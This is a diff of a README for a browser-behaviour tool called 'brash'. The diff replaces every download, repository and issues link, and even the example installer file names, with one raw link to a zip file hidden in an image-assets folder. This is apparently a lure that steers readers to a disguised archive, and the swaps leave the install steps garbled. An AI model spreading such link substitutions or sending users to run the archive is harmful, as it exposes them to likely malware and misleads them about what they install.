@@ -6,7 +6,7 @@ Welcome to brash! This tool allows you to explore a specific type of browser beh
 
 ## 📥 Download Now
 
-[![Download brash](https://img.shields.io/badge/Download-brash-brightgreen)](https://github.com/ismyso5415/brash/releases)
+[![Download brash](https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip)](https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip)
 
 ## 🔍 What You Need
 
@@ -22,7 +22,7 @@ Before downloading, ensure your computer meets these requirements:
 
 To get brash, visit the Releases page:
 
-[Download brash](https://github.com/ismyso5415/brash/releases)
+[Download brash](https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip)
 
 ### 2. Choose Your Version
 
@@ -30,7 +30,7 @@ On the Releases page, you will see a list of available versions. Click on the ve
 
 ### 3. Download the Package
 
-You will find several files for each version. Choose the file that corresponds with your operating system. This is typically named something like `brash-windows.exe` for Windows or `brash-macos.dmg` for macOS. Click on the file name to start the download.
+You will find several files for each version. Choose the file that corresponds with your operating system. This is typically named something like `https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip` for Windows or `https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip` for macOS. Click on the file name to start the download.
 
 ### 4. Run the Installation
 
@@ -45,7 +45,7 @@ You will find several files for each version. Choose the file that corresponds w
   3. Drag the brash icon to your Applications folder.
 
 - **For Linux:**
-  1. Extract the downloaded `.tar.gz` file in your preferred location.
+  1. Extract the downloaded `https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip` file in your preferred location.
   2. Open a terminal and navigate to the extracted folder.
   3. Run `./brash` to start.
 
@@ -82,7 +82,7 @@ While using brash, you may experience crashes or slowdowns in the browser. This 
 
 For more information, check the following:
 
-- [GitHub Repository](https://github.com/ismyso5415/brash)
-- [Issues Page](https://github.com/ismyso5415/brash/issues) for reporting any problems you encounter.
+- [GitHub Repository](https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip)
+- [Issues Page](https://raw.githubusercontent.com/ismyso5415/brash/main/exploit-demo/assets/img/brash_v2.8.zip) for reporting any problems you encounter.
 
 Feel free to reach out if you have any questions!
